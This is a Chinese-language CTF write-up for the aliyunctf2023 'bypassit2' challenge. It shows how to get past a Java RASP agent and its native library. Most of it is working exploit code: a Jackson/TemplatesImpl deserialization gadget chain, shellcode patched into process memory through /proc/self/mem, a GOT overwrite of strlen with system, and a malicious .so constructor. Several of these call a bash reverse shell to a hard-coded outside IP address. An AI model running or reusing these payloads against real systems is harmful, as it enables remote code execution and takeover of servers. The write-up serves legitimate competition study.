---
layout: post
title: aliyunctf2023-bypassit2
date: 2023-05-05 15:54 +0800
categories: [ctf, web]
tag: [web, java, jackson, rasp]
---
## 环境依赖
* jdk 8u332
* 看一下pom.xml
  * `spring-boot-starter-web`
  * `spring-boot-starter-test` 
  * 版本2.6.11
jar同上一篇博客 要绕rasp

## 分析jar部分
```java
public NaiveRaspClassFileTransformer(Instrumentation inst) {
    this.inst = inst;
    MethodDescriptor dom = new MethodDescriptor("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl", "getStylesheetDOM", "", false);
    MethodDescriptor setAccess = new MethodDescriptor("java.lang.reflect.AccessibleObject", "setAccessible0", "", false);
    MethodDescriptor spel = new MethodDescriptor("org.springframework.expression.common.TemplateAwareExpressionParser", "parseExpression", "", false);
    MethodDescriptor scriptEngine = new MethodDescriptor("javax.script.ScriptEngineManager", "init", "", false);
    this.hooks.add(new BlockHook(dom, "true"));
    this.hooks.add(new BlockHook(setAccess, "!com.naiverasp.Utils.checkTrust()"));
    this.hooks.add(new BlockHook(spel, "!com.naiverasp.Utils.checkTrust()"));
    this.hooks.add(new BlockHook(scriptEngine, "!com.naiverasp.Utils.checkTrust()"));
}
```

* 调用到TemplatesImpl的getStylesheetDOM
* 调用到AccessibleObject的setAccessible0
* 调用到TemplateAwareExpressionParser的parseExpression（没用到）
* 调用到javax.script.ScriptEngineManager的init（没用到）

用之前的exp打一下，报了两种错

```
com.naiverasp.Utils.printStackTrace
java.lang.reflect.AccessibleObject.setAccessible0
java.lang.reflect.AccessibleObject.setAccessible
java.lang.Class$1.run
java.lang.Class$1.run
java.security.AccessController.doPrivileged
java.lang.Class.newInstance
com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.getTransletInstance
com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.newTransformer
com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.getOutputProperties
sun.reflect.NativeMethodAccessorImpl.invoke0
sun.reflect.NativeMethodAccessorImpl.invoke
sun.reflect.DelegatingMethodAccessorImpl.invoke
java.lang.reflect.Method.invoke
com.fasterxml.jackson.databind.ser.BeanPropertyWriter.serializeAsField
com.fasterxml.jackson.databind.ser.std.BeanSerializerBase.serializeFields
com.fasterxml.jackson.databind.ser.BeanSerializer.serialize
com.fasterxml.jackson.databind.SerializerProvider.defaultSerializeValue
com.fasterxml.jackson.databind.node.POJONode.serialize
com.fasterxml.jackson.databind.node.ArrayNode.serialize
```

```
com.naiverasp.Utils.printStackTrace
com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.getStylesheetDOM
sun.reflect.NativeMethodAccessorImpl.invoke0
sun.reflect.NativeMethodAccessorImpl.invoke
sun.reflect.DelegatingMethodAccessorImpl.invoke
java.lang.reflect.Method.invoke
com.fasterxml.jackson.databind.ser.BeanPropertyWriter.serializeAsField
com.fasterxml.jackson.databind.ser.std.BeanSerializerBase.serializeFields
com.fasterxml.jackson.databind.ser.BeanSerializer.serialize
com.fasterxml.jackson.databind.SerializerProvider.defaultSerializeValue
com.fasterxml.jackson.databind.node.POJONode.serialize
com.fasterxml.jackson.databind.node.ArrayNode.serialize
```


尝试把命令执行改为写文件，发现可以正常写入，说明class正常加载了，回过头来看这个jar
`TemplatesImpl` call `getStylesheetDOM`

```java
// 打印栈帧
if(true) return;
```

但是我们知道`TemplatesImpl`的getter最重要的是`getOutputProperties`
```java
// 打印栈帧
if(!com.naiverasp.Utils.checkTrust()) return null;
```
从结果可以看出checkTrust的结果是true(报错里没打印class name xxx)

```java
public static boolean checkTrust() {
    try {
        for(int i = 4; i < 8; ++i) {
            Class clazz = Reflection.getCallerClass(i);
            ClassLoader loader = clazz.getClassLoader();
            if (loader != null && loader != Thread.currentThread().getContextClassLoader()) {
                System.out.println("class name " + clazz.getName() + " loader " + loader);
                return false;
            }
        }
    } catch (Exception var3) {
        var3.printStackTrace();
    }

    return true;
}
```

## 分析so部分
jar部分没什么阻碍，接下来看看so部分

* 对load的位置做限制 必须是`/usr/local/openjdk-8/jre/lib/amd64/`下，且不能有`..`
```c
__int64 __fastcall wuload(__int64 a1, __int64 a2, __int64 a3, unsigned __int8 a4)
{
  const char *v7; // [rsp+28h] [rbp-8h]

  v7 = (const char *)(*(__int64 (__fastcall **)(__int64, __int64, _QWORD))(*(_QWORD *)a1 + 1352LL))(a1, a3, 0LL);
  printf("lib name: %s\n", v7);
  if ( !(unsigned int)containsDots(v7) && (unsigned int)startsWith(v7, "/usr/local/openjdk-8/jre/lib/amd64/") )
    oldLoad(a1, a2, a3, a4);
  return (*(__int64 (__fastcall **)(__int64, __int64, const char *))(*(_QWORD *)a1 + 1360LL))(a1, a3, v7);
}
```
* 对forkAndExec的调用作了限制 这个很底层 导致`java.lang.runtime.getRuntime().exec`用不了就是这个原因
  
这里提供多种解法
## 解法一: 修改代码段，布置shellcode（推荐）

{: .prompt-tip }
> 读取`/proc/self/maps`可以得到当前进程的内存映射关系，读该文件的内容可得到内存代码段基址。

{: .prompt-info }
> `/proc/self/mem`是进程的内存内容，通过修改该文件相当于直接修改当前进程的内存

{: .prompt-tip }
> 可通过写入mem文件来直接写入内存，例如直接修改代码段，放入我们的shellcode，从而在程序流程执行到这一步时执行shellcode来拿shell。

* 读`/proc/self/maps` 寻找`libnativerasp.so`的基地址
* 在ida中查看`wuforkAndExec`的偏移
* 使用pwntools生成shellcode
* 读`/proc/self/mem` 修改内存

`gen.py`
```python
import requests,base64
from pwn import *
context.update(arch='amd64')
shellcode = asm(shellcraft.amd64.execve("/bin/bash",["/bin/bash","-c","bash -i >& /dev/tcp/121.5.230.115/7777 0>&1"]))
print(struct.unpack("b" * len(shellcode), shellcode))
```

`BypassRasp.java`
```java
import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.RandomAccessFile;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class BypassRasp {
    public static long getLibBaseAddr(String pathName) throws IOException {
        Path path = Paths.get(pathName);
        byte[] bytes = Files.readAllBytes(path);
        String regEx = "([0-9a-f]{12})-.*libnativerasp.so";
        Pattern pattern = Pattern.compile(regEx);
        Matcher matcher = pattern.matcher(new String(bytes));
        while(matcher.find()) {
            long addr = Long.parseLong(matcher.group().split("-")[0], 16);
            return addr;
        }
        return 0L;
    }
    public static void patchMemory(long addr, byte[] b) throws IOException {
        RandomAccessFile f = new RandomAccessFile("/proc/self/mem", "rw");
        f.seek(addr);
        f.write(b);
        f.close();
    }

    public BypassRasp() throws IOException {
        long libAddr = getLibBaseAddr("/proc/self/maps");
        long forkExecOffset = 0x12AD;
        long forkExecAddr = libAddr + forkExecOffset;
        byte[] shellcode = {106, 104, 72, -72, 47, 98, 105, 110, 47, 98, 97, 115, 80, 72, -119, -25, 106, 1, -2, 12, 36, 72, -72, 55, 55, 55, 32, 48, 62, 38, 49, 80, 72, -72, 51, 48, 46, 49, 49, 53, 47, 55, 80, 72, -72, 47, 49, 50, 49, 46, 53, 46, 50, 80, 72, -72, 47, 100, 101, 118, 47, 116, 99, 112, 80, 72, -72, 104, 32, 45, 105, 32, 62, 38, 32, 80, 72, -72, 1, 1, 1, 1, 1, 1, 1, 1, 80, 72, -72, 105, 1, 44, 98, 1, 99, 96, 114, 72, 49, 4, 36, 72, -72, 47, 98, 105, 110, 47, 98, 97, 115, 80, 49, -10, 86, 106, 21, 94, 72, 1, -26, 86, 106, 26, 94, 72, 1, -26, 86, 106, 24, 94, 72, 1, -26, 86, 72, -119, -26, 49, -46, 106, 59, 88, 15, 5};
        patchMemory(forkExecAddr, shellcode);
        // 主动触发wuforkAndExec
        java.lang.Runtime.getRuntime().exec("id");
    }
}

```

`Test.java`
```java
import com.fasterxml.jackson.databind.ObjectMapper;
import com.fasterxml.jackson.databind.node.*;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassPool;
import javassist.CtClass;

import javax.management.BadAttributeValueExpException;
import java.io.*;
import java.lang.reflect.Field;
import java.util.Base64;

public class Test {
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception{
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj,value);
    }

    public static byte[] getEvilByteCode() throws Exception{
        ClassPool pool = ClassPool.getDefault();
        CtClass cc = pool.get("BypassRasp");
        cc.setSuperclass((pool.get(AbstractTranslet.class.getName())));
        //获取字节码
        return cc.toBytecode();
    }

    public static String getBase64Data(Object obj) throws IOException {
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
        objectOutputStream.writeObject(obj);
        objectOutputStream.close();
        return Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray());
    }

    public static Object readBase64Data(String base64Data) throws Exception {
        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(Base64.getDecoder().decode(base64Data));
        ObjectInputStream ois = new ObjectInputStream(byteArrayInputStream);
        Object obj = ois.readObject();
        ois.close();
        return obj;
    }

    public static void main(String[] args) throws Exception {
        byte[] code = getEvilByteCode();
        TemplatesImpl tpl = new TemplatesImpl();
        setFieldValue(tpl, "_bytecodes", new byte[][]{code});
        setFieldValue(tpl, "_name", "233");
        setFieldValue(tpl, "_tfactory", new TransformerFactoryImpl());

//        POJONode obj = new POJONode(tpl);
        ObjectMapper mapper = new ObjectMapper();
        ArrayNode arr = mapper.createArrayNode();
        arr.addPOJO(tpl);


        BadAttributeValueExpException bad = new BadAttributeValueExpException("1");
        setFieldValue(bad,"val", arr);

        String output = getBase64Data(bad);
        System.out.println(output);
    }
}

```



## 解法二：覆盖GOT表

* 覆盖GOT表中的`strlen`为`system`
* 修改常量`/usr/local/openjdk-8/jre/lib/amd64/`为`/bin/bash -c '反弹shell'`


```c
__int64 __fastcall wuload(__int64 a1, __int64 a2, __int64 a3, unsigned __int8 a4)
{
  const char *v7; // [rsp+28h] [rbp-8h]

  v7 = (const char *)(*(__int64 (__fastcall **)(__int64, __int64, _QWORD))(*(_QWORD *)a1 + 1352LL))(a1, a3, 0LL);
  printf("lib name: %s\n", v7);
  if ( !(unsigned int)containsDots(v7) && (unsigned int)startsWith(v7, "/usr/local/openjdk-8/jre/lib/amd64/") )
    oldLoad(a1, a2, a3, a4);
  return (*(__int64 (__fastcall **)(__int64, __int64, const char *))(*(_QWORD *)a1 + 1360LL))(a1, a3, v7);
}
```

```c
_BOOL8 __fastcall startsWith(const char *a1, const char *a2)
{
  int v3; // [rsp+18h] [rbp-8h]
  int v4; // [rsp+1Ch] [rbp-4h]

  v3 = strlen(a1);
  v4 = strlen(a2);
  return v3 >= v4 && strncmp(a1, a2, v4) == 0;
}
```

```java
import java.io.*;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class BypassRasp {
    public static long getLibBaseAddr(String pathName, String soName) throws IOException {
        Path path = Paths.get(pathName);
        byte[] bytes = Files.readAllBytes(path);
        String regEx = "([0-9a-f]{12})-.*" + soName;
        Pattern pattern = Pattern.compile(regEx);
        Matcher matcher = pattern.matcher(new String(bytes));
        while(matcher.find()) {
            long addr = Long.parseLong(matcher.group().split("-")[0], 16);
            return addr;
        }
        return 0L;
    }
    public static void patchMemory(long addr, byte[] b) throws IOException {
        RandomAccessFile f = new RandomAccessFile("/proc/self/mem", "rw");
        f.seek(addr);
        f.write(b);
        f.close();
    }
    public static byte[] toByteArray(long value) {
        byte[] array = new byte[8];
        for (int i = 0; i < array.length; i++) {
            array[i] = (byte) ((value >> (i * 8)) & 0xff);
        }
        return array;
    }

    public BypassRasp() throws IOException {
        long libRaspAddr = getLibBaseAddr("/proc/self/maps","libnativerasp.so");
        long libcAddr = getLibBaseAddr("/proc/self/maps","libc-2.31.so");

        long systemOffset = 0x48e50L;
        long systemAddr = libcAddr + systemOffset;

        long strlenOffset = 0x4030L;
        long strlenGotAddr = libRaspAddr + strlenOffset;
        patchMemory(strlenGotAddr, toByteArray(systemAddr));
        
        long startsWithAddr = 0x2028 + libRaspAddr;
        patchMemory(startsWithAddr, "/bin/bash -c 'bash -i >& /dev/tcp/121.5.230.115/7777 0>&1';#".getBytes());
        System.load("/lib/x86_64-linux-gnu/libc-2.31.so");
    }

}
```
## 解法三：修改wuforkAndExec的代码段向原地址跳

其汇编代码如下

```
mov rax, 0x123456789abcdef
jmp rax
```

```python
>>> asm("mov rax,0xdeadbeef").hex()
'48b8efbeadde00000000'
>>> asm('jmp rax')
b'\xff\xe0'
```


```python
shellcode = [0x48, 0xb8, *(list(target.to_bytes(8,'little'))), 0xff, 0xe0]
shellcode = struct.unpack("b"*len(shellcode), bytes(shellcode))
```

## 解法四：修改加载.so的位置为`/`
官方解法
* 写so
* 修改`/usr/local/openjdk-8/jre/lib/amd64/` 为 `/\x00sr/local/openjdk-8/jre/lib/amd64/`
* `System.load('/tmp/eval.so')`

```c
#include <stdlib.h>
__attribute__((constructor)) void aaanb(){
        unsetenv("LD_PRELOAD");
        system("/bin/bash -c 'bash -i >& /dev/tcp/121.5.230.115/7777 0>&1'");
}
// gcc -fPIC -shared hack.c -o hack.so
```